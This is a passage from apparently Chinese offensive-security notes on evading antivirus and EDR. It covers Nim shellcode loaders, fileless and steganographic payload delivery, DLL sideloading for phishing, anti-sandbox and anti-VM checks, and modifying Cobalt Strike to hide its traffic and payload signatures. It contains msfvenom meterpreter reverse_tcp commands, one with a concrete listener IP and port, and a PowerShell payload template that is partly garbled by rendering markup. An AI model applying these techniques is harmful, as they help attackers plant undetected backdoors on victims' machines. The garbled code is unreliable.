<h4 id="1033-shellcode转ipv4方式"><a class="markdownIt-Anchor" href="#1033-shellcode转ipv4方式">#</a> 10.3.3 ShellCode 转 IPV4 方式</h4>
<p>IPv4 是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。<br>
此协议会尽努力交付数据包，它不保证任何数据包均能送达目的地，也不保证</p>
<p>所有数据包均按照正确的顺序无重复地到达。IPv4 使用 32 位（ 4 字节）地址。<br>
Go: py 将 shellcode 转为 go ipv 4 ，go 调用 IPV 4 加载，并加壳进行保护。</p>
<h3 id="104-nim免杀"><a class="markdownIt-Anchor" href="#104-nim免杀">#</a> 10.4 nim 免杀</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nim编程：https://github.com/ScxMes/Core-Nim-programming</span><br><span class="line">nim安装及上线：https://mp.weixin.qq.com/s/YKkCcqeiQLwyw4cJvQHilA</span><br></pre></td></tr></table></figure>
<h4 id="1041-工具封装木马"><a class="markdownIt-Anchor" href="#1041-工具封装木马">#</a> 10.4.1 工具封装木马</h4>
<p><strong>0 x01 NimShellCodeLoader -</strong> 无效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https://github.com/aeverj/NimShellCodeLoader</span><br><span class="line">使用人数过多，已经变成了指纹库，不再具有免杀的特性</span><br></pre></td></tr></table></figure>
<p><strong>0x 02 nim</strong> 相关编译参数</p>
<p>c：编译成 C 语言，如：nim c test.nim<br>
cpp：编译成 C++ 语言，如：nim cpp test.nim<br>
objc：编译成 objc 语言<br>
 js：编译成 javascript 脚本，可以建一个 html 文件在<script src="test.js">&lt;/sc<br>
ript &gt; 里运行.</p>
<ul>
<li>d:release：进行 release 编译。nim cc -d:release test.nim</li>
<li>r：编译完成后运行程序<br>
–cincludes：包含当前目录 (./) 的 c 头文件.<br>
–cpu：指定架构，如：nim cc -cpu amd64 , nim cc -cpu:arm。<br>
编译 x64：nim c -d:mingw --app:gui --cpu:amd64 -d:danger -d:strip --opt:si<br>
ze --passc=-flto --passl=-flto test.nim<br>
 编译 x86：nim c -d:mingw --app:gui --cpu:i386 -d:danger -d:strip --opt:size<br>
–passc=-flto --passl=-flto test.nim</li>
</ul>
<p><strong>0x03 OffensiveNim</strong> 多种方式加载 <strong>shellcode</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/byt3bl33d3r/OffensiveNim</span><br></pre></td></tr></table></figure>
<p>（ 1 ）通过进程迁移 shellcode_fiber.nim - x 60</p>
<p>使用 msf/cs 生成 64 位的 c# 木马，将木马植入到 nim 代码中，注意 nim 代<br>
码命名中只允许出现英文，不能有 - 的特殊字符，编译为 exe 文件</p>
<h1 id="msfvenom-p-windowsx64messagebox-f-csharp-then-modified-for-nim-arrays"><a class="markdownIt-Anchor" href="#msfvenom-p-windowsx64messagebox-f-csharp-then-modified-for-nim-arrays">#</a> ./msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays</h1>
<p>（ 2 ）通过内联 asm shellcode_inline_asm_bin.nim - x 60</p>
<p>去除多余的代码，用 nim 加载 shellcode 并编译为 exe</p>
<h1 id="msfvenom-p-windowsx64exec-cmdcalcexe-exitfuncthread-f-csharp"><a class="markdownIt-Anchor" href="#msfvenom-p-windowsx64exec-cmdcalcexe-exitfuncthread-f-csharp">#</a> ./msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp</h1>
<p>（ 3 ）通过创建的挂起进程注入 shellcode_bin.nim - x 60</p>
<h1 id="msfvenom-p-windowsx64messagebox-f-csharp-then-modified-for-nim-arrays-2"><a class="markdownIt-Anchor" href="#msfvenom-p-windowsx64messagebox-f-csharp-then-modified-for-nim-arrays-2">#</a> ./msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays</h1>
<h4 id="1042-无文件落地的nim免杀"><a class="markdownIt-Anchor" href="#1042-无文件落地的nim免杀">#</a> 10.4.2 无文件落地的 nim 免杀</h4>
<p>（ 1 ）参数型 nim 脚本<br>
参数可以选取 bin 后缀的文件或者编码后的 shellcode<br>
 编译 nim，与 bin 文件一起放入到对方主机中，通常 bin 文件会被查杀，可<br>
以绕过 hr<br>
（ 2 ）参数编码型脚本<br>
以参数形式将 hex 的 shellcode 拼接在 exe 程序后边，可以规避查杀 df<br>
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=<br>
xxxx -f hex<br>
use multi/handler/exploit<br>
set payload windows/x64/meterpreter/reverse_tcp<br>
（ 3 ）图片隐写 nim 脚本<br>
准备两个 nim 脚本，一个的作用是将 payload.bin 通过自己设置的密码隐写<br>
在图片中或者从隐写的图片中还原隐写的内容，另一个是用来利用隐写图片的<br>
 nim 脚本<br>
编译第二个脚本，可以选择从远程 http 获取图片并拼接密码，也可以以文<br>
件的方式读取图片。编译好的 exe 放在对方主机中，自己的隐写图片放在远程<br>
服务器上，通过命令行调用 exe 加载远程隐写图片中的木马可以规避杀毒软件。<br>
可以绕过 x60 /df/hr。<br>
（ 4 ）通过 socket 建立连接<br>
类似于 nc 聊天，将客户端给服务端发送命令执行上线木马的命令获取对方<br>
主机的 shell，可利用 powershell 读取外部 http 的木马。</p>
<h4 id="1043-转换shellcode为uuid执行"><a class="markdownIt-Anchor" href="#1043-转换shellcode为uuid执行">#</a> 10.4.3 转换 shellcode 为 uuid 执行</h4>
<h1 id="msfvenom-p-windowsx64exec-cmdcalcexe-exitfuncthread-f-csharp-2"><a class="markdownIt-Anchor" href="#msfvenom-p-windowsx64exec-cmdcalcexe-exitfuncthread-f-csharp-2">#</a> ./msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp</h1>
<p>准备 nim 脚本可以加载 64 位的 uuid，将上述代码转为 uuid 并添加到 nim 脚<br>
本中，运行此脚本将会弹出 calc。可以用这个方法将 shellcode 转化为 uuid 执行。</p>
<h3 id="105-应用层面免杀"><a class="markdownIt-Anchor" href="#105-应用层面免杀">#</a> 10.5 应用层面免杀</h3>
<h5 id="常见查杀方式理论点"><a class="markdownIt-Anchor" href="#常见查杀方式理论点">#</a> 常见查杀方式理论点：</h5>
<h5 id="1-特征码扫描"><a class="markdownIt-Anchor" href="#1-特征码扫描">#</a> （ 1 ）特征码扫描：</h5>
<h5 id="所谓特征码其实就是程序内部的一串或者几串二进制机器码-特征码匹配"><a class="markdownIt-Anchor" href="#所谓特征码其实就是程序内部的一串或者几串二进制机器码-特征码匹配">#</a> 所谓特征码其实就是程序内部的一串或者几串二进制机器码。特征码匹配</h5>
<h5 id="工作原理是先总结出某个病毒的特征码然后在目标文件中搜索看有没有类似"><a class="markdownIt-Anchor" href="#工作原理是先总结出某个病毒的特征码然后在目标文件中搜索看有没有类似">#</a> 工作原理是先总结出某个病毒的特征码，然后在目标文件中搜索看有没有类似</h5>
<h5 id="的匹配如果有匹配就暂定为病毒文件-优点速度快配备高性能的扫描引"><a class="markdownIt-Anchor" href="#的匹配如果有匹配就暂定为病毒文件-优点速度快配备高性能的扫描引">#</a> 的匹配，如果有匹配就暂定为病毒文件。优点：速度快，配备高性能的扫描引</h5>
<h5 id="擎准确率相对比较高误杀操作相对较少很少需要用户参与"><a class="markdownIt-Anchor" href="#擎准确率相对比较高误杀操作相对较少很少需要用户参与">#</a> 擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。</h5>
<h5 id="缺点采用病毒特征代码法的检测工具面对不断出现的新病毒必须不"><a class="markdownIt-Anchor" href="#缺点采用病毒特征代码法的检测工具面对不断出现的新病毒必须不">#</a> 缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不</h5>
<h5 id="断更新病毒库的版本否则检测工具便会老化逐渐失去实用价值病毒特征"><a class="markdownIt-Anchor" href="#断更新病毒库的版本否则检测工具便会老化逐渐失去实用价值病毒特征">#</a> 断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征</h5>
<h5 id="代码法对从未见过的新病毒无法知道其特征代码因而无法去检测新病毒"><a class="markdownIt-Anchor" href="#代码法对从未见过的新病毒无法知道其特征代码因而无法去检测新病毒">#</a> 代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；</h5>
<h5 id="病毒特征码如果没有经过充分的检验可能会出现误报数据误删系统破坏"><a class="markdownIt-Anchor" href="#病毒特征码如果没有经过充分的检验可能会出现误报数据误删系统破坏">#</a> 病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏，</h5>
<h5 id="给用户带来麻烦"><a class="markdownIt-Anchor" href="#给用户带来麻烦">#</a> 给用户带来麻烦。</h5>
<h5 id="2-文件和校验法"><a class="markdownIt-Anchor" href="#2-文件和校验法">#</a> （ 2 ）文件和校验法</h5>
<p>将正常文件 A 的 hash 值保存，然后如果有一个新的 A 文件发送过来计算其<br>
 hash 值，如果与正常文件的不同，那么认定为病毒文件。</p>
<p>（ 3 ）沙盒检测</p>
<p>基于行为的检测，看有没有一些敏感的行为来确定文件是否为病毒。优点<br>
是可能发现未知的病毒，缺点是误报相对较高，需要用户参与。</p>
<p>（ 4 ）云查杀</p>
<p>类似于特征码查杀。只是如果特征码库没有匹配值的时候会把文件上传到<br>
云端继续分析，有时候扫描病毒刚扫描出来不是病毒，但过一会儿扫描就是病<br>
毒了，这种行为就是云查杀。</p>
<h4 id="1051-特征码花指令与加壳"><a class="markdownIt-Anchor" href="#1051-特征码花指令与加壳">#</a> 10.5.1 特征码花指令与加壳</h4>
<p><strong>0x 01</strong> 特征码位置修改 <strong>- hr</strong></p>
<p>先生成一个 shellcode，并选取一个语言生成为 exe，此时不免杀但是是一个<br>
后门，通过工具提取出防病毒软件的特征码，用 ollydeg 工具对特征码的位置进<br>
行修改。<br>
采用 jmp 的方式跳转到 00 位置，赋予 00 位置为特征码，执行结束后在 cal<br>
l 回原来位置。<br>
即打乱了原有的执行顺序，来实现了绕过防病毒软件的检测。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简而言之，特征码区域汇编移动到全 0 区域后用jmp调用。</span><br></pre></td></tr></table></figure>
<p><strong>0 x02</strong> 花指令改入口 <strong>-</strong> 失效</p>
<p>添加花指令重定向修改入口地址从而打乱特征码位置。<br>
生成随机的花指令代码，通过 ollydeg 添加到 00 位置，并借助其他工具改<br>
变入口地址为花指令入口地址，花指令执行结束后再跳转到原木马的入口，实<br>
测是已失效。</p>
<p><strong>0x 03</strong> 对木马加壳</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加壳：通过UPX对pyinstaller打包的程序进行加壳 - hr</span><br><span class="line">加资源：通过Restorator对木马exe进行伪装为正常软件的图标及版本信息</span><br></pre></td></tr></table></figure>
<ul>
<li>管家<br>
加保护：由 Shielden 等工具在原有 exe 程序之外套一层保护 - hr</li>
</ul>
<h4 id="1052-dll劫持"><a class="markdownIt-Anchor" href="#1052-dll劫持">#</a> 10.5.2 dll 劫持</h4>
<p><strong>0 x0 1</strong> 调用加载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">准备c++脚本生成shellcode的dll程序，用dll.py调用dll会上线</span><br></pre></td></tr></table></figure>
<p><strong>0 x 02</strong> 白加黑方式导入加载</p>
<p>寻找白名单的应用程序的软件，这些软件在执行时会调用 dll 文件，将自己<br>
通过 c++ 或者其他语言写的经过免杀处理后的 dll 程序导出，（studyPE）并绑定<br>
在原先白程序执行时会加载的 dll 上，当对方执行此软件的时候，dll 会被加载，<br>
就会上线<br>
可以用火绒剑监控软件运行时会加载的 dll 程序</p>
<p><strong>0 x 03</strong> 白加黑方式导出编译 <strong>-</strong> 钓鱼操作</p>
<p>一部分的应用是不能用通过 PE 工具进行导入 dll 程序的，可以自行制作原<br>
白名单应用运行时所加载的 dll。即将自己的 dll 木马添加到原有加载的 dll 上。<br>
用 Dependencies 工具将原有 dll 反编译为源码，分别为 c、asm、h 三个文<br>
件。新建 dll 工程，设置 VS 的相关参数，并加载原有文件，使得可以正常导出<br>
原有 dll。写 c/c++ 脚本写免杀木马的 dll，通过隐写在图片中的木马加载。当双<br>
击 exe 程序时，dll 被调用，通过隐写在图片中的木马被加载至内存，对方主机<br>
上线。<br>
工具推荐：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01yLVVuMWswZDNyL0RLTUM=">https://github.com/Mr-Un1k0d3r/DKMC</span></p>
<h4 id="1053-sys回调与hook"><a class="markdownIt-Anchor" href="#1053-sys回调与hook">#</a> 10.5.3 sys 回调与 hook</h4>
<h5 id="av会检测软件有没有病毒"><a class="markdownIt-Anchor" href="#av会检测软件有没有病毒">#</a> AV：会检测软件有没有病毒</h5>
<p>EDR：会检测软件的来源与功能，会对文件进行 hook，跟踪文件的走向<br>
工具推荐：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzdCaXRzVGVhbS9FRFItQnlwYXNzLWRlbW8=">https://github.com/7BitsTeam/EDR-Bypass-demo</span><br>
 可以过卡巴斯基、eset、 360 、火绒、defender、McAee 等 AV/EDR 防病毒<br>
软件。<br>
Windows 下有两种处理器访问模式：用户模式（user mode）和内核模式<br>
（kernel mode）。<br>
用户模式下运行应用程序时，Windows 会为该程序创建一个新进程，提供<br>
一个私有虚拟地址空间和一个私有句柄表，因为私有，一个应用程序无法修改<br>
另一个应用程序的私有虚拟地址空间的数据；<br>
内核模式下，所有运行的代码都共享一个虚拟地址空间，因此内核中驱动<br>
程序可能还会因为写入错误的地址空间导致其他驱动程序甚至系统出现错误。<br>
内核中包含了大部分操作系统的内部数据结构，所以用户模式下的应用程序在<br>
访问这些数据结构或调用内部 Windows 例程以执行特权操作的时候，必须先从<br>
用户模式切换到内核模式，这里就涉及到系统调用。<br>
x86 windows 使用 sysenter 实现系统调用。<br>
x64 windows 使用 syscall 实现系统调用。<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ljeWd1aWRlci9TaGhobG9hZGVy">https://github.com/icyguider/Shhhloader</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9qMDBydS52ZXhpbGxpdW0ub3JnL3N5c2NhbGxzL250LzY0Lw==">https://j00ru.vexillium.org/syscalls/nt/64/</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTQ0MDEy">https://cloud.tencent.com/developer/article/1944012</span></p>
<h3 id="106-其他免杀技术"><a class="markdownIt-Anchor" href="#106-其他免杀技术">#</a> 10.6 其他免杀技术</h3>
<h4 id="1061-反调试与反虚拟化"><a class="markdownIt-Anchor" href="#1061-反调试与反虚拟化">#</a> 10.6.1 反调试与反虚拟化</h4>
<h5 id="近年来各类恶意软件层出不穷反病毒软件也更新了各种检测方案以提"><a class="markdownIt-Anchor" href="#近年来各类恶意软件层出不穷反病毒软件也更新了各种检测方案以提">#</a> 近年来，各类恶意软件层出不穷，反病毒软件也更新了各种检测方案以提</h5>
<h5 id="高检测率-其中比较有效的方案是动态沙箱检测技术即通过在沙箱中运行程"><a class="markdownIt-Anchor" href="#高检测率-其中比较有效的方案是动态沙箱检测技术即通过在沙箱中运行程">#</a> 高检测率。其中比较有效的方案是动态沙箱检测技术，即通过在沙箱中运行程</h5>
<h5 id="序并观察程序行为来判断程序是否为恶意程序-为了逃避沙箱安全人员的检测"><a class="markdownIt-Anchor" href="#序并观察程序行为来判断程序是否为恶意程序-为了逃避沙箱安全人员的检测">#</a> 序并观察程序行为来判断程序是否为恶意程序。为了逃避沙箱 / 安全人员的检测，</h5>
<h5 id="恶意软件使用了各类识别沙箱虚拟机的技术用于判断自身程序是否运行在沙"><a class="markdownIt-Anchor" href="#恶意软件使用了各类识别沙箱虚拟机的技术用于判断自身程序是否运行在沙">#</a> 恶意软件使用了各类识别沙箱 / 虚拟机的技术，用于判断自身程序是否运行在沙</h5>
<h5 id="箱虚拟机中"><a class="markdownIt-Anchor" href="#箱虚拟机中">#</a> 箱 / 虚拟机中。</h5>
<p><strong>0x0 1</strong> 反调试技术</p>
<p>（ 1 ）调试器检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IsDebuggerPresent API ，PEB.BeingDebugged...</span><br><span class="line">TLS 回调，hard/software breakpoints， VirtualAlloc</span><br></pre></td></tr></table></figure>
<p>（ 2 ）DLL 注入检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检测是否有DLL注入此进程来实现对进程的行为监控（HOOK）</span><br></pre></td></tr></table></figure>
<p>（ 3 ）Virtual Box 检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">检测文件，例如VBoxMouse.sys， VirtualBox Guest Additions directory...</span><br><span class="line">检测注册表，进程，服务，例如VBoxControl.exe， VBoxService...</span><br><span class="line">检测硬件名称，MAC地址等等...</span><br></pre></td></tr></table></figure>
<p>（ 4 ）VMware 检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">与VB检测类似</span><br></pre></td></tr></table></figure>
<p>（ 5 ）其他虚拟平台检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如 Xen, QEMU, Wine, Paralles...</span><br></pre></td></tr></table></figure>
<p>（ 6 ）分析工具进程检测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检测如OD, ProcessMonitor, Autorun 等分析工具进程的存在....</span><br></pre></td></tr></table></figure>
<p>（ 7 ）通用沙盒 / 虚拟机检测</p>
<p>检测是否存在特殊进程名，模块名<br>
通过 WMI 检测真实硬件状态，例如硬盘大小，内存大小，CPU 风扇，型<br>
号，BIOS 序列号名称，电源电压，温度等等…</p>
<p><strong>0x0 2</strong> 沙盒平台<br>
微步沙盒：<span class="exturl" data-url="aHR0cHM6Ly9zLnRocmVhdGJvb2suY24v">https://s.threatbook.cn/</span><br>
 腾讯哈勃分析系统：<span class="exturl" data-url="aHR0cHM6Ly9oYWJvLnFxLmNvbS8=">https://habo.qq.com/</span><br>
 魔盾：<span class="exturl" data-url="aHR0cHM6Ly93d3cubWFsZHVuLmNvbS9hbmFseXNpcy8=">https://www.maldun.com/analysis/</span><br>
 微点沙盒：<span class="exturl" data-url="aHR0cHM6Ly9zYW5kYm94LmRlcHRoc2VjLmNvbS5jbi9pbmRleC5waHAv">https://sandbox.depthsec.com.cn/index.php/</span><br>
 奇安信文件深度分析平台：<span class="exturl" data-url="aHR0cHM6Ly9zYW5kYm94LnRpLnFpYW54aW4uY29tL3NhbmRib3gvcGFnZQ==">https://sandbox.ti.qianxin.com/sandbox/page</span><br>
ANYRUN：<span class="exturl" data-url="aHR0cHM6Ly9hcHAuYW55LnJ1bi8=">https://app.any.run/</span><br>
HybridAnalysis (Falcon Sandbox)：<span class="exturl" data-url="aHR0cHM6Ly93d3cuaHlicmlkLWFuYWx5c2lzLmNvbS8=">https://www.hybrid-analysis.com/</span><br>
CAPE Sandbox: <span class="exturl" data-url="aHR0cHM6Ly9jYXBlc2FuZGJveC5jb20v">https://capesandbox.com/</span><br>
BD Sandbox Analyzer：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYml0ZGVmZW5kZXIuY29tL2J1c2luZXNzL2VudGVycHJpc2UtcHJvZHVjdHMvc2FuZGJveC0=">https://www.bitdefender.com/business/enterprise-products/sandbox-</span><br>
analyzer.html<br>
Joe Sanbox: <span class="exturl" data-url="aHR0cHM6Ly93d3cuam9lc2FuZGJveC5jb20v">https://www.joesandbox.com/</span></p>
<p><strong>0x0 3</strong> 规避 <strong>VT</strong> 检测</p>
<p>（ 1 ）虚拟机检测 禁止虚拟机运行</p>
<p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 L<br>
PORT=6688 -f hex<br>
python 查看 cpu、memory 的核数实现，通过命令行判断当前是否是虚拟机，<br>
通过有虚拟机才有的特殊文件判断是否是虚拟机等多种方法结合起来，综合判<br>
断当前是否在虚拟机内，如果是，则不允许执行 shellcode，否则释放代码，执<br>
行上线。<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8yNDgxNzUuaHRt">https://www.jb51.net/article/248175.htm</span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIwMjcxNy5odG1s">https://www.freebuf.com/articles/system/202717.html</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xjMTk5MjA3MjcvYXJ0aWNsZS9kZXRhaWxzLzEyMjgyMDIwOQ==">https://blog.csdn.net/lc19920727/article/details/122820209</span><br>
 也可以通过 c++ 语言进行综合判断当前是否在虚拟机，如果是再执行 shellc<br>
ode<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYXJlcHViL0NoZWNrVk0tU2FuZGJveA==">https://github.com/sharepub/CheckVM-Sandbox</span></p>
<p>（ 2 ）调试检测 禁止 od 调试</p>
<p>如果我们在对抗的过程中被蓝队人员拿到了样本，他想用 od 去调一下这个<br>
程序怎么走的，肯定也不会拿到本机里面调，如果这个 exe 有毒，那电脑就全<br>
完了，所以最好的选择还是虚拟机环境，首先反调试的第一个目标就是反虚拟<br>
机调试。<br>
查阅资料后发现如果使用虚拟机，一般的路径都为 (在没有修改过的情况下)<br>
C:\Program Files\VMware<br>
 查看几个虚拟机后发现 vm 的默认进程有 vmtoolsd.exe 和 vmacthlp.exe，直<br>
接判断进程是否存在即可起到反调试的效果<br>
参考链接：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzc1OA==">https://forum.butian.net/share/758</span></p>
<p>（ 3 ）反沙箱调试 禁止沙箱运行</p>
<p>最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的<br>
程序的父进程都是 explorer。如果一个程序的父进程不是 explorer，那么我们就<br>
可以认为他是由沙箱启动的。那么我们就直接 exit 退出，这样杀软就无法继续<br>
对我们进行行为分析了。<br>
绕过：伪造父进程为 explorer.exe 呢，那么上面这种反调试的方法就行不通<br>
了。采用这种方法之后，木马仍然可以再沙箱中调试。<br>
反调试及绕过：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbUMwWGhOU3dkaGhJU3djQkZYZTB1UQ==">https://mp.weixin.qq.com/s/mC0XhNSwdhhISwcBFXe0uQ</span></p>
<p>（ 4 ）程序保护 禁止虚拟机、od 调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">项目推荐：https://github.com/LordNoteworthy/al-khaser</span><br><span class="line">参考链接：https://bbs.kafan.cn/thread- 2181869 - 1 - 1.html</span><br></pre></td></tr></table></figure>
<p>al-khaser 是一个具有良好意图的 PoC “恶意软件” 应用程序，旨在强调您的<br>
反恶意软件系统。它执行一系列常见的恶意软件技巧，目的是查看您是否躲在<br>
雷达之下。</p>
<h4 id="1062-二次开发cs"><a class="markdownIt-Anchor" href="#1062-二次开发cs">#</a> 10.6.2 二次开发 CS</h4>
<p><strong>0 x0 1</strong> 反编译 <strong>cs</strong> 的 <strong>jar</strong> 文件</p>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3plcjB5dS9Bd2Vzb21lLUNvYmFsdFN0cmlrZQ==">https://github.com/zer0yu/Awesome-CobaltStrike</span><br>
 反编译 Jar 包、新建 Java（ 11 ）项目、修改上线代码、打包替换编译、替换<br>
服务客户端<br>
反编译：java -cp IDEA_HOME/plugins/java-decompiler/lib/java-decompiler.j<br>
ar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true <sr
c.jar> <dest dir><br>
具体命令：“D:\program files\Java\jdk11\bin\java.exe” -cp “C:\Program Files<br>
JetBrains\IntelliJ IDEA 2022.1.3\plugins\java-decompiler\lib\java-decompiler.jar” o<br>
rg.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstr<br>
ike.jar coba<br>
 会在 coba 下生成.jar 文件，此时在智能解压会反编译为.java 后缀的源码</p>
<p><strong>0 x 02</strong> 对端口密码证书做特征消除</p>
<p>・cobaltstrike.beacon_keys 和 cobaltstrike.store 不要使用默认的文件，删除<br>
・profile 文件要换新的，启动服务端时记得加载，或直接把 jar 包里面的默认<br>
配置给改了</p>
<ul>
<li>开在公网的 teamserver 不要使用默认端口<br>
链接：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3plcjB5dS9Bd2Vzb21lLUNvYmFsdFN0cmlrZQ==">https://github.com/zer0yu/Awesome-CobaltStrike</span><br>
<strong>0x0 3</strong> 对 <strong>http/s</strong> 上线流量做特征消除</li>
</ul>
<p>checksum8 函数对比后续 - common\CommonUtils&amp;cloudstrike\WebServer<br>
 观察 cs 上线时的日志，会在木马运行时访问一个 4 位英文字符组成的文件，<br>
逆向分析源码之后发现这四个字符经过某种算法计算之后显示为 9 2/93，可以以<br>
此为基础，对源码进行修改，改变 http/https 流量的特征码，修改原流量特征。<br>
将修改好的文件编译为 class 文件，以解压缩的方式覆盖在 jar 包中，替换<br>
原有的 class 文件，以此来使自己修改的部分生效。</p>
<p><strong>0x0 4</strong> 对 <strong>Powershell</strong> 生成 <strong>Payload</strong> 做特征消除</p>
<p>功能生成 - 搜代码块 -&gt; 找引用 (template.x86.ps1)-&gt;BaseResourceUtils-&gt;_buildP<br>
owerShellNoHint</p>
<p>用自己已经免杀过的 powershell 脚本来替换原有的未免杀脚本，将文件替<br>
换为原有的模板文件，编译为 class，以压缩包的方式进行替换，由此生成的 po<br>
wershell payload 是免杀的。<br>
也可以修改 artifact.exe 的特征码达到生成的 exe 文件就是免杀的，但是比<br>
较难哦。</p>
<p><strong>0 x0 5 powershell</strong> 免杀 <strong>hr</strong> 模版文件：</p>
<p>找源码中生成 powershell 木马的源文件及逻辑，修改模板文件，将模板文<br>
件改为如下内容，同时编译修改的文件为 class 文件，替换原有 class 文件中的<br>
文件，实现生成的文件即免杀。<br>
Set-StrictMode -Version 2<br>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mn>1</mn><msup><mo>=</mo><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">x1=&#x27;&#x27;;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mpunct">;</span></span></span></span>x2=’%%DATA%%’;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mn>3</mn><msup><mo>=</mo><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup></mrow><annotation encoding="application/x-tex">x3=&#x27;&#x27;
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>xx1=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Strin<br>
g(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x1))
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>xx2=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Strin<br>
g(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mn>2</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x2))
